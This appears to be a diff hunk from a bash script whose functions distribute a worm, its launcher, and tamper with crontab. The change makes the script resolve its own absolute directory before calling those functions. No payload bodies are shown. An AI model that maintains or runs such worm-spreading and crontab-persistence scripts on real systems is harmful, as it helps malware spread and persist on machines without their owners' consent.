@@ -58,7 +58,8 @@ distribute_worm_launcher(){
     fi
 }
 
-cd "$(dirname ${BASH_SOURCE[0]})"
+parent_path=$( cd "$(dirname "${BASH_SOURCE[0]}")" ; pwd -P )
+cd "$parent_path"
 if distribute_worm_launcher && distribute_worm && tamper_crontab ; then
     echo "All tasks successed."
 else
